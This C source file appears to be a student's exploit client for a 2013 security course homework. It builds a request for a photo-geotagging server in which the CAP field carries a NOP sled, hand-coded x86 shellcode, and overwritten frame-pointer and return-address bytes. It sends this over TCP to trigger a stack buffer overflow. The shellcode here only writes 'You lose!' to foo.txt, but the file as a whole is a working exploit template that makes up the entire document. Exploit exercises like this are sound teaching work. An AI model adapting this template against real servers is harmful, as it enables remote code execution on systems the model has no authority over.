/* file: client1.c class: 18-732, Spring 2013, assignment: Homework 1
*/

/* Obligatory includes */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <stdarg.h>
#include <errno.h>



int main(int argc, char** argv)
{

char shellcode[] =
	"\xeb\x39\x5e\x31"
	"\xc0\x88\x46\x07"
	"\x88\x46\x11\x8d"
	"\x5e\x08\x89\x5e"
	"\x12\xb0\x05\x8d"
	"\x1e\x66\xb9\x42"
	"\x04\x66\xba\xe4"
	"\x01\xcd\x80\x89"
	"\xc3\xb0\x04\x8b"
	"\x4e\x12\x66\xba"
	"\x0f\x27\x66\x81"
	"\xea\x06\x27\xcd"
	"\x80\xb0\x06\xcd"
	"\x80\xb0\x01\x31"
	"\xdb\xcd\x80\xe8"
	"\xc2\xff\xff\xff"
	"\x66\x6f\x6f\x2e"
	"\x74\x78\x74\x23"
	"\x59\x6f\x75\x20"
	"\x6c\x6f\x73\x65"
	"\x21\x23\x78\x78"
	"\x78\x78";


	int scLen = strlen(shellcode); //length of shellcode

	char reqstring[1000] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;";
	
	char attach[558 - scLen];
	memset(attach, 0x00, 558 - scLen);
	memset(attach, 0x90, 557 - scLen);
	strcat(reqstring, attach);
	
	strcat(reqstring,shellcode);
	
	char extra[101];
	memset(extra, 0x00, 101);
	memset(extra, 0x43, 100);
	strcat(reqstring,extra);


	strcat(reqstring, ";CAP:");
	strcat(reqstring, "\xf0\x4f\x48\x55"); //ebp, 4 bytes
	strcat(reqstring, "\x40\x4D\x48\x55"); //return address, 4 bytes, in the middle of the gt.cap buffer


	int PORTNUM;
	char SERVER_IP[16];

	int sock, nbytes, i, total, s;
	char request[1000];
	char recvline[1000];
	struct sockaddr_in srv;

	/* Set up some defaults for if you don't enter any parameters */ 
	PORTNUM = 18732;
	strcpy(SERVER_IP, "127.0.0.1");	

	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");

	/* Process command line switches */
	/* Usage: client [-port <port_number>] [-server <server_IP>] */
	for(i = 1; i < argc; i++){
		if(argv[i][0] == '-'){
			if(strcmp(argv[i], "-port") == 0){
				PORTNUM = atoi(argv[++i]);
			}else if(strcmp(argv[i], "-server") == 0){
				strncpy(SERVER_IP, argv[++i],16);
	
            }else{
				printf("Unknown switch \"%s\"\n", argv[i]);
				exit(1);
			}
		}else{
			printf("Unknown switch \"%s\"\n", argv[i]);
			exit(1);
		}
	}

	/* Fill in the server data structure */
	memset(&srv, 0, sizeof(srv));
	srv.sin_family = AF_INET;
	srv.sin_port = htons(PORTNUM);
	srv.sin_addr.s_addr = inet_addr(SERVER_IP);

	/* Create the socket */
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

        printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);

	/* Connect to the socket */
	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
		perror("connect");
		exit(1);
	}

	printf("The request is:\n%s\n", reqstring); 

	/* Make the request */
	strncpy(request, reqstring,1000 ); 
	total = 0;
	s = strlen(request);
	while( total < s){
		nbytes = write(sock, request + total, s);
		total = total + nbytes;
	} 

        printf("The response of the server is:\n");	

	/* Get and output the response */
	nbytes = 0;
	while( (nbytes = read(sock, recvline, 1000)) > 0){
		recvline[nbytes] = 0;
		printf("%s\n", recvline); 
	}

	

	return(0);
}

